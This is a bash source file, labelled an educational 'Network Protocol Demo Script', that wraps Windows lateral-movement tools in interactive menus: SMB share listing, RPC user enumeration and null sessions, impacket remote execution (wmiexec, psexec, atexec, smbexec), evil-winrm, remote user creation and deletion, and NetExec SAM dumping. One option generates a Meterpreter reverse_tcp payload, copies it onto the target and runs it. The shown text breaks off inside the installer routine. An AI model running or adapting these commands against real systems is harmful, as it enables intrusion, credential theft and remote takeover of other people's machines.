#!/bin/bash

# Network Protocol Demo Script
# For educational and authorized testing purposes only

# Add /snap/bin to PATH if it exists and isn't already in PATH
if [ -d /snap/bin ] && [[ ":$PATH:" != *":/snap/bin:"* ]]; then
    export PATH="$PATH:/snap/bin"
fi

# Color codes for better visibility
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Function to display and execute commands
exec_cmd() {
    echo -e "${CYAN}[CMD]${NC} $@"
    "$@"
}

# Global variables
TARGET_IP=""
USERNAME=""
PASSWORD=""
DOMAIN=""

# Parse command line arguments
parse_arguments() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--target)
                TARGET_IP="$2"
                shift 2
                ;;
            -u|--username)
                USERNAME="$2"
                shift 2
                ;;
            -p|--password)
                PASSWORD="$2"
                shift 2
                ;;
            -d|--domain)
                DOMAIN="$2"
                shift 2
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Unknown option: $1${NC}"
                show_usage
                exit 1
                ;;
        esac
    done
}

# Show usage information
show_usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -t, --target IP      Target IP address"
    echo "  -u, --username USER  Username for authentication"
    echo "  -p, --password PASS  Password for authentication"
    echo "  -d, --domain DOMAIN  Domain name (optional)"
    echo "  -h, --help           Show this help message"
    echo ""
    echo "Example:"
    echo "  $0 -t 192.168.1.100 -u admin -p password123"
    echo "  $0 -t 192.168.1.100 -u admin -p password123 -d CONTOSO"
    echo ""
    echo "Note: If arguments are not provided, you will be prompted interactively."
}

# Banner
print_banner() {
    echo -e "${BLUE}"
    echo "================================================"
    echo "    Network Protocol Demo Script"
    echo "    For Educational Purposes Only"
    echo "================================================"
    echo -e "${NC}"
}

# Get target information
get_target_info() {
    # Only prompt for missing information
    if [ -z "$TARGET_IP" ]; then
        read -p "Target IP: " TARGET_IP
    else
        echo -e "${GREEN}[+] Target IP: $TARGET_IP${NC}"
    fi
    
    if [ -z "$USERNAME" ]; then
        read -p "Username: " USERNAME
    else
        echo -e "${GREEN}[+] Username: $USERNAME${NC}"
    fi
    
    if [ -z "$PASSWORD" ]; then
        read -sp "Password: " PASSWORD
        echo
    else
        echo -e "${GREEN}[+] Password: [SET]${NC}"
    fi
    
    if [ -z "$DOMAIN" ]; then
        read -p "Domain (leave empty if none): " DOMAIN
        echo
    else
        echo -e "${GREEN}[+] Domain: $DOMAIN${NC}"
    fi
}

# SMB Menu
smb_menu() {
    while true; do
        echo -e "\n${GREEN}=== SMB Operations ===${NC}"
        echo "1. Authenticate to SMB"
        echo "2. List data from ADMIN$"
        echo "3. List data from C$"
        echo "4. Back to main menu"
        read -p "Choose option: " smb_choice
        
        case $smb_choice in
            1)
                echo -e "${YELLOW}[*] Authenticating to SMB...${NC}"
                if [ -z "$DOMAIN" ]; then
                    exec_cmd smbclient -L //$TARGET_IP -U "$USERNAME%$PASSWORD"
                else
                    exec_cmd smbclient -L //$TARGET_IP -U "$USERNAME%$PASSWORD" -W "$DOMAIN"
                fi
                ;;
            2)
                echo -e "${YELLOW}[*] Listing ADMIN$ share...${NC}"
                if [ -z "$DOMAIN" ]; then
                    exec_cmd smbclient //$TARGET_IP/ADMIN$ -U "$USERNAME%$PASSWORD" -c "ls"
                else
                    exec_cmd smbclient //$TARGET_IP/ADMIN$ -U "$USERNAME%$PASSWORD" -W "$DOMAIN" -c "ls"
                fi
                ;;
            3)
                echo -e "${YELLOW}[*] Listing C$ share...${NC}"
                if [ -z "$DOMAIN" ]; then
                    exec_cmd smbclient //$TARGET_IP/C$ -U "$USERNAME%$PASSWORD" -c "ls"
                else
                    exec_cmd smbclient //$TARGET_IP/C$ -U "$USERNAME%$PASSWORD" -W "$DOMAIN" -c "ls"
                fi
                ;;
            4)
                break
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
    done
}

# RPC Menu
rpc_menu() {
    while true; do
        echo -e "\n${GREEN}=== RPC Operations ===${NC}"
        echo "1. RPC through SMB"
        echo "2. RPC through raw TCP"
        echo "3. IPC$ null session connection"
        echo "4. IPC$ connection through RPC (enumerate accounts)"
        echo "5. Back to main menu"
        read -p "Choose option: " rpc_choice
        
        case $rpc_choice in
            1)
                echo -e "${YELLOW}[*] Connecting via RPC over SMB...${NC}"
                if [ -z "$DOMAIN" ]; then
                    exec_cmd rpcclient -U "$USERNAME%$PASSWORD" $TARGET_IP -c "srvinfo"
                    echo -e "${YELLOW}[*] Enumerating users and shares via RPC over SMB...${NC}"
                    exec_cmd rpcclient -U "$USERNAME%$PASSWORD" $TARGET_IP -c "enumdomusers; netshareenum"
                else
                    exec_cmd rpcclient -U "$DOMAIN/$USERNAME%$PASSWORD" $TARGET_IP -c "srvinfo"
                    echo -e "${YELLOW}[*] Enumerating users and shares via RPC over SMB...${NC}"
                    exec_cmd rpcclient -U "$DOMAIN/$USERNAME%$PASSWORD" $TARGET_IP -c "enumdomusers; netshareenum"
                fi
                ;;
            2)
                echo -e "${YELLOW}[*] Enumerating RPC endpoints via TCP...${NC}"
                if [ -z "$DOMAIN" ]; then
                    echo -e "${YELLOW}[*] Enumerating users via RPC over TCP...${NC}"
                    exec_cmd rpcclient -U "$USERNAME%$PASSWORD" "ncacn_ip_tcp:$TARGET_IP[135,sign,seal,spnego]" -c "enumdomusers"
                else
                    echo -e "${YELLOW}[*] Enumerating users via RPC over TCP...${NC}"
                    exec_cmd rpcclient -U "$DOMAIN/$USERNAME%$PASSWORD" "ncacn_ip_tcp:$TARGET_IP[135,sign,seal,spnego]" -c "enumdomusers"
                fi
                ;;
            3)
                echo -e "${YELLOW}[*] Attempting IPC$ null session...${NC}"
                exec_cmd rpcclient -U "" -N $TARGET_IP -c "enumdomusers"
                ;;
            4)
                echo -e "${YELLOW}[*] Enumerating through RPC...${NC}"
                if [ -z "$DOMAIN" ]; then
                    exec_cmd rpcclient -U "$USERNAME%$PASSWORD" $TARGET_IP -c "enumdomusers"
                else
                    exec_cmd rpcclient -U "$DOMAIN/$USERNAME%$PASSWORD" $TARGET_IP -c "enumdomusers"
                fi
                ;;
            5)
                break
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
    done
}

# WMI Menu
wmi_menu() {
    while true; do
        echo -e "\n${GREEN}=== WMI Operations ===${NC}"
        echo "1. WMI connection executing whoami"
        echo "2. Back to main menu"
        read -p "Choose option: " wmi_choice
        
        case $wmi_choice in
            1)
                echo -e "${YELLOW}[*] Executing whoami via WMI...${NC}"
                if [ -z "$DOMAIN" ]; then
                    exec_cmd impacket-wmiexec "$USERNAME:$PASSWORD@$TARGET_IP" "whoami"
                else
                    exec_cmd impacket-wmiexec "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP" "whoami"
                fi
                ;;
            2)
                break
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
    done
}

# RDP Menu
rdp_menu() {
    while true; do
        echo -e "\n${GREEN}=== RDP Operations ===${NC}"
        echo "1. Raw RDP (port 3389)"
        echo "2. Back to main menu"
        read -p "Choose option: " rdp_choice
        
        case $rdp_choice in
            1)
                echo -e "${YELLOW}[*] Connecting via Raw RDP on port 3389...${NC}"
                if [ -z "$DISPLAY" ]; then
                    echo -e "${RED}[!] No display detected. RDP requires a graphical environment.${NC}"
                    echo -e "${YELLOW}[*] Options:${NC}"
                    echo "  1. Run from a graphical terminal (set DISPLAY variable)"
                    echo "  2. Use rdesktop instead: rdesktop $TARGET_IP -u $USERNAME -p $PASSWORD"
                    echo "  3. Use xfreerdp with manual display: DISPLAY=:0 xfreerdp /v:$TARGET_IP /u:$USERNAME /p:$PASSWORD"
                    echo -e "${CYAN}[CMD]${NC} xfreerdp /v:$TARGET_IP /u:$USERNAME /p:$PASSWORD /cert:ignore +clipboard"
                else
                    exec_cmd xfreerdp /v:$TARGET_IP /u:$USERNAME /p:$PASSWORD /cert:ignore +clipboard
                fi
                ;;
            2)
                break
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
    done
}

# WinRM Menu
winrm_menu() {
    while true; do
        echo -e "\n${GREEN}=== WinRM Operations ===${NC}"
        echo "1. Unencrypted traffic over 5985 TCP"
        echo "2. Encrypted traffic over 5986 (SSL)"
        echo "3. Back to main menu"
        read -p "Choose option: " winrm_choice
        
        case $winrm_choice in
            1)
                echo -e "${YELLOW}[*] Connecting via WinRM (HTTP - Port 5985)...${NC}"
                if [ -z "$DOMAIN" ]; then
                    exec_cmd evil-winrm -i $TARGET_IP -u $USERNAME -p "$PASSWORD"
                else
                    exec_cmd evil-winrm -i $TARGET_IP -u "$DOMAIN\\$USERNAME" -p "$PASSWORD"
                fi
                ;;
            2)
                echo -e "${YELLOW}[*] Connecting via WinRM (HTTPS - Port 5986)...${NC}"
                if [ -z "$DOMAIN" ]; then
                    exec_cmd evil-winrm -i $TARGET_IP -u $USERNAME -p "$PASSWORD" -S -P 5986
                else
                    exec_cmd evil-winrm -i $TARGET_IP -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" -S -P 5986
                fi
                ;;
            3)
                break
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
    done
}

# TA-Techniques Menu
ta_techniques_menu() {
    while true; do
        echo -e "\n${GREEN}=== TA-Techniques ===${NC}"
        echo "1. Net User (User management)"
        echo "2. File Copy (SMB file transfer)"
        echo "3. AtSvc (Create scheduled task)"
        echo "4. PsExec (Remote command execution)"
        echo "5. Meterpreter (Payload execution and decoding)"
        echo "6. CrackMapExec (Network exploitation)"
        echo "7. WMI-Exec (WMI command execution)"
        echo "8. Back to main menu"
        read -p "Choose option: " ta_choice
        
        case $ta_choice in
            1)
                echo -e "${YELLOW}[*] Net User - User Management${NC}"
                echo -e "${YELLOW}[*] User enumeration and management operations${NC}"
                echo "1. List all users"
                echo "2. Get user details"
                echo "3. Add new user"
                echo "4. Delete user"
                read -p "Choose operation: " net_user_op
                
                case $net_user_op in
                    1)
                        echo -e "${YELLOW}[*] Listing all users...${NC}"
                        if [ -z "$DOMAIN" ]; then
                            exec_cmd net rpc user -U "$USERNAME%$PASSWORD" -S $TARGET_IP
                        else
                            exec_cmd net rpc user -U "$DOMAIN/$USERNAME%$PASSWORD" -S $TARGET_IP
                        fi
                        ;;
                    2)
                        read -p "Enter username to query: " QUERY_USER
                        if [ -z "$DOMAIN" ]; then
                            exec_cmd net rpc user info $QUERY_USER -U "$USERNAME%$PASSWORD" -S $TARGET_IP
                        else
                            exec_cmd net rpc user info $QUERY_USER -U "$DOMAIN/$USERNAME%$PASSWORD" -S $TARGET_IP
                        fi
                        ;;
                    3)
                        read -p "Enter new username: " NEW_USER
                        read -p "Enter password for new user: " NEW_PASS
                        if [ -z "$DOMAIN" ]; then
                            exec_cmd net rpc user add $NEW_USER $NEW_PASS -U "$USERNAME%$PASSWORD" -S $TARGET_IP
                        else
                            exec_cmd net rpc user add $NEW_USER $NEW_PASS -U "$DOMAIN/$USERNAME%$PASSWORD" -S $TARGET_IP
                        fi
                        ;;
                    4)
                        read -p "Enter username to delete: " DEL_USER
                        if [ -z "$DOMAIN" ]; then
                            exec_cmd net rpc user delete $DEL_USER -U "$USERNAME%$PASSWORD" -S $TARGET_IP
                        else
                            exec_cmd net rpc user delete $DEL_USER -U "$DOMAIN/$USERNAME%$PASSWORD" -S $TARGET_IP
                        fi
                        ;;
                    *)
                        echo -e "${RED}[!] Invalid operation${NC}"
                        ;;
                esac
                ;;
            2)
                echo -e "${YELLOW}[*] File Copy via SMB${NC}"
                read -p "Enter local file path to copy: " LOCAL_FILE
                read -p "Enter remote destination path (e.g., C$\\\\temp\\\\file.txt): " REMOTE_PATH
                if [ -z "$DOMAIN" ]; then
                    exec_cmd smbclient //$TARGET_IP/C$ -U "$USERNAME%$PASSWORD" -c "put $LOCAL_FILE $REMOTE_PATH"
                else
                    exec_cmd smbclient //$TARGET_IP/C$ -U "$USERNAME%$PASSWORD" -W "$DOMAIN" -c "put $LOCAL_FILE $REMOTE_PATH"
                fi
                ;;
            3)
                echo -e "${YELLOW}[*] AtSvc - Create Scheduled Task${NC}"
                echo "1. Use atexec.py (via AT command - legacy)"
                echo "2. Use atsvc.py (via ATSVC RPC - direct)"
                read -p "Choose method: " atsvc_method
                read -p "Enter command to execute: " TASK_CMD
                
                case $atsvc_method in
                    1)
                        # Check for atexec in order of preference
                        local ATEXEC_CMD=""
                        if command -v atexec.py >/dev/null 2>&1; then
                            ATEXEC_CMD="atexec.py"
                        elif command -v impacket-atexec >/dev/null 2>&1; then
                            ATEXEC_CMD="impacket-atexec"
                        elif [ -f /usr/share/doc/python3-impacket/examples/atexec.py ]; then
                            ATEXEC_CMD="python3 /usr/share/doc/python3-impacket/examples/atexec.py"
                        fi
                        
                        if [ -n "$ATEXEC_CMD" ]; then
                            if [ -z "$DOMAIN" ]; then
                                exec_cmd $ATEXEC_CMD "$USERNAME:$PASSWORD@$TARGET_IP" "$TASK_CMD"
                            else
                                exec_cmd $ATEXEC_CMD "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP" "$TASK_CMD"
                            fi
                        else
                            echo -e "${RED}[!] atexec not found${NC}"
                            echo -e "${YELLOW}[*] Alternative - use impacket-wmiexec for command execution${NC}"
                        fi
                        ;;
                    2)
                        # Check for atsvc in order of preference
                        local ATSVC_CMD=""
                        if command -v atsvc.py >/dev/null 2>&1; then
                            ATSVC_CMD="atsvc.py"
                        elif [ -f /usr/share/doc/python3-impacket/examples/atsvc.py ]; then
                            ATSVC_CMD="python3 /usr/share/doc/python3-impacket/examples/atsvc.py"
                        fi
                        
                        if [ -n "$ATSVC_CMD" ]; then
                            echo -e "${YELLOW}[*] Using ATSVC RPC to create scheduled task${NC}"
                            if [ -z "$DOMAIN" ]; then
                                exec_cmd $ATSVC_CMD "$USERNAME:$PASSWORD@$TARGET_IP" "$TASK_CMD"
                            else
                                exec_cmd $ATSVC_CMD "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP" "$TASK_CMD"
                            fi
                        else
                            echo -e "${RED}[!] atsvc.py not found${NC}"
                            echo -e "${YELLOW}[*] Try atexec instead or install impacket from pip${NC}"
                        fi
                        ;;
                    *)
                        echo -e "${RED}[!] Invalid method${NC}"
                        ;;
                esac
                ;;
            4)
                echo -e "${YELLOW}[*] PsExec - Remote Command Execution${NC}"
                echo -e "${YELLOW}[*] This will give you an interactive shell${NC}"
                
                # Check for psexec in order of preference
                local PSEXEC_CMD=""
                if command -v impacket-psexec >/dev/null 2>&1; then
                    PSEXEC_CMD="impacket-psexec"
                elif command -v impacket.psexec >/dev/null 2>&1; then
                    PSEXEC_CMD="impacket.psexec"
                elif command -v psexec.py >/dev/null 2>&1; then
                    PSEXEC_CMD="psexec.py"
                elif [ -f /usr/share/doc/python3-impacket/examples/psexec.py ]; then
                    PSEXEC_CMD="python3 /usr/share/doc/python3-impacket/examples/psexec.py"
                fi
                
                if [ -n "$PSEXEC_CMD" ]; then
                    if [ -z "$DOMAIN" ]; then
                        exec_cmd $PSEXEC_CMD "$USERNAME:$PASSWORD@$TARGET_IP"
                    else
                        exec_cmd $PSEXEC_CMD "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP"
                    fi
                else
                    echo -e "${RED}[!] psexec not found${NC}"
                    echo -e "${YELLOW}[*] Alternative - use impacket-wmiexec for interactive shell${NC}"
                    if [ -z "$DOMAIN" ]; then
                        exec_cmd impacket-wmiexec "$USERNAME:$PASSWORD@$TARGET_IP"
                    else
                        exec_cmd impacket-wmiexec "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP"
                    fi
                fi
                ;;
            5)
                echo -e "${YELLOW}[*] Meterpreter Operations${NC}"
                echo -e "${YELLOW}[*] Step 1: Generate Meterpreter payload${NC}"
                read -p "Enter LHOST (your IP): " LHOST
                read -p "Enter LPORT (your port): " LPORT
                PAYLOAD_FILE="meterpreter_$RANDOM.exe"
                echo -e "${YELLOW}[*] Generating payload...${NC}"
                exec_cmd msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $PAYLOAD_FILE
                echo -e "${GREEN}[+] Payload generated: $PAYLOAD_FILE${NC}"
                echo
                echo -e "${YELLOW}[*] Step 2: Setup listener${NC}"
                echo -e "${YELLOW}[*] Run these commands in msfconsole:${NC}"
                echo -e "${GREEN}  use exploit/multi/handler${NC}"
                echo -e "${GREEN}  set payload windows/x64/meterpreter/reverse_tcp${NC}"
                echo -e "${GREEN}  set LHOST $LHOST${NC}"
                echo -e "${GREEN}  set LPORT $LPORT${NC}"
                echo -e "${GREEN}  exploit${NC}"
                echo
                echo -e "${YELLOW}[*] Step 3: Deploy payload${NC}"
                read -p "Deploy payload to target now? (y/n): " deploy_payload
                if [ "$deploy_payload" = "y" ] || [ "$deploy_payload" = "Y" ]; then
                    if command -v impacket-smbexec >/dev/null 2>&1; then
                        if [ -z "$DOMAIN" ]; then
                            exec_cmd impacket-smbexec "$USERNAME:$PASSWORD@$TARGET_IP" "copy \\\\$LHOST\\share\\$PAYLOAD_FILE C:\\temp\\payload.exe && C:\\temp\\payload.exe"
                        else
                            exec_cmd impacket-smbexec "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP" "copy \\\\$LHOST\\share\\$PAYLOAD_FILE C:\\temp\\payload.exe && C:\\temp\\payload.exe"
                        fi
                    elif command -v smbexec.py >/dev/null 2>&1; then
                        if [ -z "$DOMAIN" ]; then
                            exec_cmd smbexec.py "$USERNAME:$PASSWORD@$TARGET_IP" "copy \\\\$LHOST\\share\\$PAYLOAD_FILE C:\\temp\\payload.exe && C:\\temp\\payload.exe"
                        else
                            exec_cmd smbexec.py "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP" "copy \\\\$LHOST\\share\\$PAYLOAD_FILE C:\\temp\\payload.exe && C:\\temp\\payload.exe"
                        fi
                    else
                        echo -e "${RED}[!] smbexec not available in Debian package${NC}"
                        echo -e "${YELLOW}[*] Use impacket-wmiexec as alternative${NC}"
                        if [ -z "$DOMAIN" ]; then
                            exec_cmd impacket-wmiexec "$USERNAME:$PASSWORD@$TARGET_IP" "copy \\\\$LHOST\\share\\$PAYLOAD_FILE C:\\temp\\payload.exe && C:\\temp\\payload.exe"
                        else
                            exec_cmd impacket-wmiexec "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP" "copy \\\\$LHOST\\share\\$PAYLOAD_FILE C:\\temp\\payload.exe && C:\\temp\\payload.exe"
                        fi
                    fi
                fi
                echo
                echo -e "${YELLOW}[*] Step 4: Decode/Analyze with Speakeasy${NC}"
                read -p "Analyze payload with Speakeasy? (y/n): " analyze_payload
                if [ "$analyze_payload" = "y" ] || [ "$analyze_payload" = "Y" ]; then
                    if command -v speakeasy >/dev/null 2>&1; then
                        exec_cmd speakeasy -t $PAYLOAD_FILE
                    else
                        echo -e "${RED}[!] Speakeasy not found${NC}"
                        echo -e "${YELLOW}[*] Install with: pip install speakeasy-emulator${NC}"
                    fi
                fi
                ;;
            6)
                echo -e "${YELLOW}[*] NetExec/CrackMapExec Operations${NC}"
                echo -e "${YELLOW}[*] Running NetExec against target...${NC}"
                
                # Check which command is available
                local CME_CMD=""
                if command -v nxc >/dev/null 2>&1; then
                    CME_CMD="nxc"
                elif command -v netexec >/dev/null 2>&1; then
                    CME_CMD="netexec"
                elif command -v crackmapexec >/dev/null 2>&1; then
                    CME_CMD="crackmapexec"
                else
                    echo -e "${RED}[!] NetExec/CrackMapExec not found${NC}"
                    echo -e "${YELLOW}[*] Install with: pip3 install netexec${NC}"
                    continue
                fi
                
                if [ -z "$DOMAIN" ]; then
                    exec_cmd $CME_CMD smb $TARGET_IP -u $USERNAME -p "$PASSWORD" --shares
                else
                    exec_cmd $CME_CMD smb $TARGET_IP -u $USERNAME -p "$PASSWORD" -d $DOMAIN --shares
                fi
                echo
                echo -e "${YELLOW}[*] Additional options:${NC}"
                echo "  - Enumerate users: $CME_CMD smb $TARGET_IP -u $USERNAME -p '$PASSWORD' --users"
                echo "  - Execute command: $CME_CMD smb $TARGET_IP -u $USERNAME -p '$PASSWORD' -x 'whoami'"
                echo "  - Dump SAM: $CME_CMD smb $TARGET_IP -u $USERNAME -p '$PASSWORD' --sam"
                ;;
            7)
                echo -e "${YELLOW}[*] WMI-Exec - WMI Command Execution${NC}"
                read -p "Enter command to execute: " WMI_CMD
                if [ -z "$DOMAIN" ]; then
                    exec_cmd impacket-wmiexec "$USERNAME:$PASSWORD@$TARGET_IP" "$WMI_CMD"
                else
                    exec_cmd impacket-wmiexec "$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP" "$WMI_CMD"
                fi
                ;;
            8)
                break
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
    done
}

# Main menu
main_menu() {
    while true; do
        echo -e "\n${BLUE}=== Main Menu ===${NC}"
        echo "1. SMB Operations"
        echo "2. RPC Operations"
        echo "3. WMI Operations"
        echo "4. RDP Operations"
        echo "5. WinRM Operations"
        echo "6. TA-Techniques"
        echo "7. Change target information"
        echo "8. Exit"
        read -p "Choose option: " main_choice
        
        case $main_choice in
            1)
                smb_menu
                ;;
            2)
                rpc_menu
                ;;
            3)
                wmi_menu
                ;;
            4)
                rdp_menu
                ;;
            5)
                winrm_menu
                ;;
            6)
                ta_techniques_menu
                ;;
            7)
                get_target_info
                ;;
            8)
                echo -e "${GREEN}[+] Exiting...${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
    done
}

# Check for required tools
check_requirements() {
    echo -e "${YELLOW}[*] Checking for required tools...${NC}"
    local missing_tools=()
    local apt_packages=()
    local gem_tools=()
    local manual_install=()
    
    # Check for tools and map to package names
    if ! command -v smbclient >/dev/null 2>&1; then
        missing_tools+=("smbclient")
        apt_packages+=("smbclient")
    fi
    
    if ! command -v rpcclient >/dev/null 2>&1; then
        missing_tools+=("rpcclient")
        apt_packages+=("samba-common-bin")
    fi
    
    # Check for impacket tools - Debian package only has limited tools
    # Check for wmiexec as indicator that base impacket is installed
    if ! command -v impacket-wmiexec >/dev/null 2>&1; then
        missing_tools+=("impacket")
        apt_packages+=("python3-impacket")
    fi
    
    # Note about limited Debian impacket package
    if command -v impacket-wmiexec >/dev/null 2>&1 && ! command -v impacket-psexec >/dev/null 2>&1 && ! command -v psexec.py >/dev/null 2>&1; then
        echo -e "${YELLOW}[*] Note: Debian's python3-impacket has limited tools (wmiexec, rpcdump, samrdump, secretsdump, netview)${NC}"
        echo -e "${YELLOW}[*] For full suite (psexec, atexec, smbexec, etc.), install via pip: pip3 install impacket${NC}"
    fi
    
    if ! command -v xfreerdp >/dev/null 2>&1; then
        missing_tools+=("xfreerdp")
        apt_packages+=("freerdp2-x11")
    fi
    
    if ! command -v evil-winrm >/dev/null 2>&1; then
        missing_tools+=("evil-winrm")
        gem_tools+=("evil-winrm")
    fi
    
    if ! command -v tcpdump >/dev/null 2>&1; then
        missing_tools+=("tcpdump")
        apt_packages+=("tcpdump")
    fi
    
    if ! command -v pwsh >/dev/null 2>&1; then
        missing_tools+=("pwsh")
        manual_install+=("pwsh")
    fi
    
    if ! command -v crackmapexec >/dev/null 2>&1 && ! command -v nxc >/dev/null 2>&1; then
        echo -e "${YELLOW}[*] Note: NetExec/CrackMapExec not found (optional for network exploitation)${NC}"
        echo -e "${YELLOW}[*] Install manually: pipx install netexec or from https://github.com/Pennyw0rth/NetExec${NC}"
    fi
    
    # msfvenom is optional - only warn if not found
    if ! command -v msfvenom >/dev/null 2>&1; then
        # Check if it's in snap but not in PATH
        if [ -x /snap/bin/msfvenom ]; then
            echo -e "${YELLOW}[*] Note: msfvenom found in /snap/bin but not in PATH${NC}"
            echo -e "${YELLOW}[*] Add to PATH: export PATH=\$PATH:/snap/bin${NC}"
        else
            echo -e "${YELLOW}[*] Note: msfvenom not found (optional for Meterpreter payloads)${NC}"
            echo -e "${YELLOW}[*] Install Metasploit: sudo snap install metasploit-framework${NC}"
        fi
    fi
    
    if [ ${#missing_tools[@]} -ne 0 ]; then
        echo -e "${RED}[!] Missing tools: ${missing_tools[*]}${NC}"
        if [ ${#apt_packages[@]} -gt 0 ]; then
            echo -e "${YELLOW}[*] APT packages needed: ${apt_packages[*]}${NC}"
        fi
        if [ ${#gem_tools[@]} -gt 0 ]; then
            echo -e "${YELLOW}[*] Ruby gems needed: ${gem_tools[*]}${NC}"
        fi
        if [ ${#manual_install[@]} -gt 0 ]; then
            echo -e "${YELLOW}[*] Manual installation required: ${manual_install[*]}${NC}"
        fi
        
        read -p "Do you want to install missing tools now? (y/n): " install_choice
        
        if [ "$install_choice" = "y" ] || [ "$install_choice" = "Y" ]; then
            echo -e "${YELLOW}[*] Installing missing tools...${NC}"
            
            # Check if we have sudo access
            local use_sudo=false
            if sudo -n true 2>/dev/null; then
                use_sudo=true
                echo -e "${YELLOW}[*] Using sudo for installation...${NC}"
            else
                echo -e "${YELLOW}[*] Sudo not available, will use su (root password required once)...${NC}"
            fi
            
            # Determine if we need to install anything
            local need_apt_packages=$([[ ${#apt_packages[@]} -gt 0 ]] && echo true || echo false)
            local need_gem_tools=$([[ ${#gem_tools[@]} -gt 0 ]] && echo true || echo false)
            
            # If using su, combine all commands into one to avoid multiple password prompts
            if [ "$use_sudo" = false ]; then
                local install_commands=""
                
                # Add APT package installation
                if [ "$need_apt_packages" = true ]; then
                    install_commands="apt update && apt install -y ${apt_packages[*]}"
                fi
                
                # Add Ruby gem installation
                if [ "$need_gem_tools" = true ]; then
                    if ! command -v gem >/dev/null 2>&1; then
                        # Need to install ruby-full and build dependencies
                        if [ -n "$install_commands" ]; then
                            install_commands="$install_commands && apt install -y ruby-full build-essential libffi-dev && gem install evil-winrm"
                        else
                            install_commands="apt update && apt install -y ruby-full build-essential libffi-dev && gem install evil-winrm"
                        fi
                    else
                        # Ruby already installed, just need build dependencies
                        if [ -n "$install_commands" ]; then
                            install_commands="$install_commands && apt install -y build-essential libffi-dev && gem install evil-winrm"
                        else
                            install_commands="apt update && apt install -y build-essential libffi-dev && gem install evil-winrm"
                        fi
                    fi
                fi
                
                # Execute all commands with single su call
                if [ -n "$install_commands" ]; then
                    echo -e "${YELLOW}[*] Installing all packages with single authentication...${NC}"
                    if su -c "$install_commands"; then
                        echo -e "${GREEN}[+] All packages installed successfully${NC}"
                    else
                        echo -e "${RED}[!] Installation failed${NC}"
                        read -p "Continue anyway? (y/n): " continue_choice
                        if [ "$continue_choice" != "y" ] && [ "$continue_choice" != "Y" ]; then
                            exit 1
                        fi
                    fi
                fi
                
                # Install PowerShell separately if needed (requires download)
                if [ ${#manual_install[@]} -gt 0 ]; then
                    for tool in "${manual_install[@]}"; do
                        if [ "$tool" = "pwsh" ]; then
                            echo -e "${YELLOW}[*] Installing PowerShell (requires separate download)...${NC}"
                            PWSH_DEB=$(mktemp)
                            if wget -q https://github.com/PowerShell/PowerShell/releases/download/v7.4.0/powershell_7.4.0-1.deb_amd64.deb -O "$PWSH_DEB"; then
                                if su -c "PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin dpkg -i $PWSH_DEB || apt-get install -f -y"; then
                                    echo -e "${GREEN}[+] PowerShell installed successfully${NC}"
                                else
                                    echo -e "${RED}[!] Failed to install PowerShell${NC}"
                                fi
                                rm -f "$PWSH_DEB"
                            else
                                echo -e "${RED}[!] Failed to download PowerShell${NC}"
                                echo -e "${YELLOW}[*] Install manually from: https://github.com/PowerShell/PowerShell/releases${NC}"
                            fi
                        elif [ "$tool" = "impacket" ]; then
                            echo -e "${YELLOW}[*] Installing Impacket suite via pip...${NC}"
                            if su -c "PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin apt install -y python3-pip && pip3 install impacket --break-system-packages"; then
                                echo -e "${GREEN}[+] Impacket installed successfully${NC}"
                            else
                                echo -e "${RED}[!] Failed to install Impacket${NC}"
                                echo -e "${YELLOW}[*] Try manually: pip3 install impacket${NC}"
                            fi
                        fi
                    done
                fi
            else
                # Using sudo - can run commands separately
                # Install APT packages
                if [ "$need_apt_packages" = true ]; then
                    if sudo apt update && sudo apt install -y ${apt_packages[*]}; then
                        echo -e "${GREEN}[+] APT packages installed${NC}"
                    else
                        echo -e "${RED}[!] APT installation failed${NC}"
                        read -p "Continue anyway? (y/n): " continue_choice
                        if [ "$continue_choice" != "y" ] && [ "$continue_choice" != "Y" ]; then
                            exit 1
                        fi
                    fi
                fi
            fi
            
            # Install Ruby gems (only if using sudo and not already handled above)
            if [ "$use_sudo" = true ] && [ ${#gem_tools[@]} -gt 0 ]; then
                echo -e "${YELLOW}[*] Installing Ruby gems...${NC}"
                
                # Check if ruby and gem are installed
                if ! command -v gem >/dev/null 2>&1; then
                    echo -e "${YELLOW}[*] Ruby gems not found, installing ruby-full and build tools...${NC}"
                    sudo apt install -y ruby-full build-essential libffi-dev
                else
                    # Install build dependencies if not already present
                    echo -e "${YELLOW}[*] Installing build dependencies...${NC}"
                    sudo apt install -y build-essential libffi-dev
                fi
                
                # Install evil-winrm gem
                echo -e "${YELLOW}[*] Installing evil-winrm via gem...${NC}"
                if sudo gem install evil-winrm; then
                    echo -e "${GREEN}[+] evil-winrm installed via gem${NC}"
                else
                    echo -e "${RED}[!] Failed to install evil-winrm${NC}"
                    echo -e "${YELLOW}[*] Try manually: sudo gem install evil-winrm${NC}"
                fi
            fi
            
            # Install PowerShell (only if using sudo and not already handled above)
            if [ "$use_sudo" = true ] && [ ${#manual_install[@]} -gt 0 ]; then
